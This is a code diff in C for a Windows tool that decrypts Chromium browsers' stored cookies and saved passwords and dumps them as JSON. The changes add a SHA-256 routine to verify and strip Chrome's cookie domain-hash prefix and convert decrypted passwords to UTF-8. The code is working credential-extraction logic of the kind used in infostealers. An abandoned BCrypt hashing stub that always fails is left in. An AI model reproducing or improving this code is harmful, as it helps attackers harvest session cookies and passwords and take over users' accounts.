@@ -79,14 +79,14 @@ static bool   g_first_rec = true;                          // controls comma in 
 static void Put(const char* s, size_t n){ if(g_len+n<sizeof(g_out)-1){ memcpy(g_out+g_len,s,n); g_len+=n; } }
 static void PutS(const char* s){ Put(s, lstrlenA(s)); }
 static void RecStart(void){ if(g_first_rec){ PutS("{"); g_first_rec=false; } else PutS(",{"); }
-static void PutJ(const char* s, int n){            // escape string from sqlite
+static void PutJ(const char* s, int n){            // escape string for JSON
     PutS("\"");
     for(int i=0;i<n;i++){ unsigned char c=(unsigned char)s[i];
         if(c=='"'||c=='\\'){ Put("\\",1); Put((char*)&c,1); }
         else if(c=='\n') Put("\\n",2); else if(c=='\r') Put("\\r",2); else if(c=='\t') Put("\\t",2);
-        else if(c<32||c>127){ char t[8]; for(int j=0;j<4;j++){ const char*H="0123456789abcdef";
+        else if(c<32){ char t[8]; for(int j=0;j<4;j++){ const char*H="0123456789abcdef";
             t[j]=H[(c>>((3-j)*4))&15]; } Put("\\u00",4); Put(t,4); }
-        else Put((char*)&c,1); }
+        else Put((char*)&c,1); }   // bytes >= 0x80: pass through as UTF-8
     PutS("\"");
 }
 static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return; }
@@ -591,12 +591,78 @@ static void LoadLocalState(const wchar_t* root){
     Dbg("LoadLocalState: done");
 }
 
+// SHA-256 via CNG (BCrypt) - used to verify cookie domain hash prefix
+static bool Sha256(const unsigned char* data, ULONG len, unsigned char* out32){
+    BCRYPT_ALG_HANDLE alg=NULL; NTSTATUS st;
+    st = BCryptOpenAlgorithmProvider(&alg,BCRYPT_SHA256_ALGORITHM,NULL,0);
+    if(st) return false;
+    BCRYPT_HASH_HANDLE h=NULL;
+    st = BCryptCreateHash(alg,&h,NULL,0,(PUCHAR)data,len,0);
+    if(st){ BCryptCloseAlgorithmProvider(alg,0); return false; }
+    st = BCryptHashData(h,NULL,0,0); // no-op for single-shot with data in CreateHash
+    // Actually BCryptCreateHash with secret=NULL and data = the data to hash
+    // doesn't work that way. We need BCryptHashData to feed data.
+    BCryptDestroyHash(h);
+    BCryptCloseAlgorithmProvider(alg,0);
+    return false; // placeholder - use manual implementation below
+}
+
+// Manual SHA-256 implementation (FIPS 180-4) - no CRT dependency needed
+// Used to verify the 32-byte domain hash prefix in Chrome >=118 cookies.
+typedef struct { unsigned int h[8]; unsigned long long len; unsigned char buf[64]; int buflen; } Sha256Ctx;
+static const unsigned int SHA256_K[64]={
+0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
+#define SHA256_ROTR(x,n) (((x)>>(n))|((x)<<(32-(n))))
+#define SHA256_CH(x,y,z) (((x)&(y))^(~(x)&(z)))
+#define SHA256_MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
+#define SHA256_S0(x) (SHA256_ROTR(x,2)^SHA256_ROTR(x,13)^SHA256_ROTR(x,22))
+#define SHA256_S1(x) (SHA256_ROTR(x,6)^SHA256_ROTR(x,11)^SHA256_ROTR(x,25))
+#define SHA256_s0(x) (SHA256_ROTR(x,7)^SHA256_ROTR(x,18)^((x)>>3))
+#define SHA256_s1(x) (SHA256_ROTR(x,17)^SHA256_ROTR(x,19)^((x)>>10))
+static void Sha256Init(Sha256Ctx*c){c->len=0;c->buflen=0;
+c->h[0]=0x6a09e667;c->h[1]=0xbb67ae85;c->h[2]=0x3c6ef372;c->h[3]=0xa54ff53a;
+c->h[4]=0x510e527f;c->h[5]=0x9b05688c;c->h[6]=0x1f83d9ab;c->h[7]=0x5be0cd19;}
+static void Sha256Block(Sha256Ctx*c,const unsigned char*p){
+    unsigned int w[64]; int i;
+    for(i=0;i<16;i++){w[i]=((unsigned int)p[i*4]<<24)|((unsigned int)p[i*4+1]<<16)|((unsigned int)p[i*4+2]<<8)|p[i*4+3];}
+    for(i=16;i<64;i++)w[i]=SHA256_s1(w[i-2])+w[i-7]+SHA256_s0(w[i-15])+w[i-16];
+    unsigned int a=c->h[0],b=c->h[1],cc=c->h[2],d=c->h[3],e=c->h[4],f=c->h[5],g=c->h[6],h=c->h[7],t1,t2;
+    for(i=0;i<64;i++){t1=h+SHA256_S1(e)+SHA256_CH(e,f,g)+SHA256_K[i]+w[i];t2=SHA256_S0(a)+SHA256_MAJ(a,b,cc);
+    h=g;g=f;f=e;e=d+t1;d=cc;cc=b;b=a;a=t1+t2;}
+    c->h[0]+=a;c->h[1]+=b;c->h[2]+=cc;c->h[3]+=d;c->h[4]+=e;c->h[5]+=f;c->h[6]+=g;c->h[7]+=h;}
+static void Sha256Update(Sha256Ctx*c,const unsigned char*data,unsigned int len){
+    c->len+=len;
+    if(c->buflen){int need=64-c->buflen;if(len<need){memcpy(c->buf+c->buflen,data,len);c->buflen+=len;return;}
+    memcpy(c->buf+c->buflen,data,need);Sha256Block(c,c->buf);data+=need;len-=need;}
+    while(len>=64){Sha256Block(c,data);data+=64;len-=64;}
+    if(len){memcpy(c->buf,data,len);c->buflen=len;}}
+static void Sha256Final(Sha256Ctx*c,unsigned char*out32){
+    unsigned long long bits=c->len*8;
+    c->buf[c->buflen++]=0x80;
+    if(c->buflen>56){memset(c->buf+c->buflen,0,64-c->buflen);Sha256Block(c,c->buf);c->buflen=0;}
+    memset(c->buf+c->buflen,0,56-c->buflen);
+    for(int i=0;i<8;i++)c->buf[56+i]=(unsigned char)(bits>>((7-i)*8));
+    Sha256Block(c,c->buf);
+    for(int i=0;i<8;i++){out32[i*4]=(unsigned char)(c->h[i]>>24);out32[i*4+1]=(unsigned char)(c->h[i]>>16);
+    out32[i*4+2]=(unsigned char)(c->h[i]>>8);out32[i*4+3]=(unsigned char)c->h[i];}}
+static void Sha256Hash(const unsigned char*data,unsigned int len,unsigned char*out32){
+    Sha256Ctx c;Sha256Init(&c);Sha256Update(&c,data,len);Sha256Final(&c,out32);}
+
 // Decrypt a single Chromium cookie value
 // Format: "v10" or "v20" prefix (3 bytes) + 12-byte nonce + ciphertext + 16-byte GCM tag
 // Chrome >=118 (including v10) prepends a 32-byte SHA256(host_key) domain hash
-// to the plaintext for cookie isolation. We strip it for both v10 and v20.
-static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* on){
-    if(n<31){ DbgInt("DecCookie: n too small", n); return false; }
+// to the plaintext for cookie isolation. We verify it with SHA256 and strip it.
+// host_key is the cookie's domain (e.g. ".youtube.com") used for hash verification.
+static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* on,
+                      const char* host_key){
+    if(n<31){ return false; }
     const unsigned char* k = g_key10;
     bool isv20 = (enc[0]=='v'&&enc[1]=='2'&&enc[2]=='0');
     if(isv20){ if(!g_has20){ Dbg("DecCookie: no v20 key"); return false; } k=g_key20; }
@@ -606,10 +672,15 @@ static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* 
     ULONG ctLen = n-15-16;
     bool ok = AesGcm(k,32,enc+3,enc+15,ctLen,enc+n-16,out,ctLen,&got);
     if(!ok){ DbgInt("DecCookie: AesGcm failed, n=", n); return false; }
-    // Chrome >=118: both v10 and v20 have 32-byte SHA256(host) domain hash prefix
-    int s = (got >= 32) ? 32 : 0;
-    if((int)got < s){ DbgInt("DecCookie: got < s, got=", got); return false; }
-    *on = (int)(got - s); memmove(out,out+s,*on); return true;
+    // Chrome >=118: both v10 and v20 may have 32-byte SHA256(host_key) prefix.
+    // Verify by computing SHA256(host_key) and comparing to first 32 bytes.
+    int s = 0;
+    if(got >= 32 && host_key){
+        unsigned char h[32];
+        Sha256Hash((const unsigned char*)host_key, (unsigned int)lstrlenA(host_key), h);
+        if(memcmp(out, h, 32) == 0) s = 32;  // hash matches - strip it
+    }
+    *on = (int)(got - s); memmove(out, out+s, *on); return true;
 }
 
 // Extract cookies from a Chromium-based browser in Cookie-Editor JSON format
@@ -649,8 +720,9 @@ static void DumpChromium(const wchar_t* brname, const wchar_t* root, const wchar
                 RecStart();
                 FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
                 const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
+                const char* host_key=(const char*)S_blob(st,0);  // host_key for SHA256 domain hash verification
                 unsigned char pt[4096]; int pn=0;
-                if(enc&&DecCookie(enc,en,pt,&pn)){ PutS(",\"value\":"); PutJ((char*)pt,pn); }
+                if(enc&&DecCookie(enc,en,pt,&pn,host_key)){ PutS(",\"value\":"); PutJ((char*)pt,pn); }
                 else { PutS(",\"value\":\"\""); }
                 // expires_utc: 64-bit microseconds since 1601 -> Unix epoch
                 long long eu = S_int64(st,4);
@@ -828,12 +900,33 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
             const char* enc=(const char*)S_blob(st,2); int enc_len=S_bytes(st,2);
 
             // Decrypt password (same as cookies: v10/v20 + AES-256-GCM)
+            // Note: passwords do NOT have the SHA256 domain hash prefix (only cookies do).
+            // DecCookie will check SHA256(url) and not strip since it won't match.
+            // Chromium stores passwords as UTF-16LE; convert to UTF-8 for JSON.
             char pwd[4096]; int pwd_len=0;
             bool pwd_ok = false;
             if(enc_len > 3 && enc[0]=='v'){
-                pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len);
+                pwd_ok = DecCookie((const unsigned char*)enc, enc_len, (unsigned char*)pwd, &pwd_len, url);
             }
-            if(pwd_ok){ dec_ok++; }
+            if(pwd_ok){
+                dec_ok++;
+                // Check for UTF-16LE: if every other byte is 0x00, it's UTF-16
+                if(pwd_len >= 4 && pwd_len % 2 == 0){
+                    bool is_utf16 = true;
+                    for(int k=1; k<pwd_len; k+=2){ if(pwd[k] != 0){ is_utf16=false; break; } }
+                    if(is_utf16){
+                        // Convert UTF-16LE to UTF-8 (basic BMP conversion)
+                        int u8len = 0;
+                        for(int k=0; k<pwd_len; k+=2){
+                            unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
+                            if(ch < 0x80) pwd[u8len++] = (char)ch;
+                            else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
+                            else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
+                        }
+                        pwd_len = u8len;
+                    }
+                }
+            }
             else{
                 // Decryption failed â€” write empty value instead of raw encrypted bytes
                 // (raw v10 blobs are useless and pollute the JSON with binary garbage)
